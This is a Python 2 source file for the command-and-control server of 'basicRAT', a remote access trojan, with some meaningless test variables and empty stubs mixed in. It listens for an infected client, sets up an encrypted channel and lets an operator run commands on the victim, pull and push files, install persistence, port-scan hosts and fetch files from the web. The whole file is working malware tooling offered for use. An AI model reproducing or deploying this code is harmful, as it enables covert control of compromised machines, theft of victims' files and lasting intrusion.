#!/usr/bin/env python
# -*- coding: utf-8 -*-


'''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|


'''

""" Basic RAT """
'''   test   '''

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import argparse
import readline
import socket
import struct
import sys
import time

try:
    from core.crypto import AES_decrypt,AES_encrypt,diffiehellman
    from core.filesock import recvfile, sendfile
except ImportError as e:
    print e
    sys.exit(0)

#--------------------------------------------------------- [Global] ---------------------------------------------------------#


HELP_TEXT = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''

BANNER = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|


'''


COMMANDS = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]

testStringVar1 = """a""" + "HELP_TEXT"
testStringVar2 = '''HELP_TEXT''' + HELP_TEXT + '''COMMANDS'''
testStringVar3 = "COMMANDS"
testStringVar4 = 'HELP_TEXT' + 'COMMANDS' + "HELP_TEXT"

#--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#

def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def EmptyFunc():
    """ comment """

class EmptyClass:

    """dd"""

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(port)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...'.format(port)

    s.listen(10)
    conn, addr = s.accept()

    DHKEY = diffiehellman(conn, server=True)

    while True:
        prompt = raw_input('\n[{}] basicRAT> '.format(addr[0])).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # ensure command is valid before sending
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue

        # display help text
        if cmd == 'help':
            print HELP_TEXT
            continue

        # send data to client
        conn.send(AES_encrypt(prompt, DHKEY))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print AES_decrypt(recv_data, DHKEY).rstrip()

        # download a file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                recvfile(conn, fname, DHKEY)

        # send file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                sendfile(conn, fname, DHKEY)

        # regenerate DH key
        elif cmd == 'rekey':
            DHKEY = diffiehellman(conn, server=True)

        # results of survey, persistence, unzip, or wget
        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(cmd)
            recv_data = conn.recv(1024)
            print AES_decrypt(recv_data, DHKEY)

#----------------------------------------------------------------------------------------------------------------------------#

#----------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
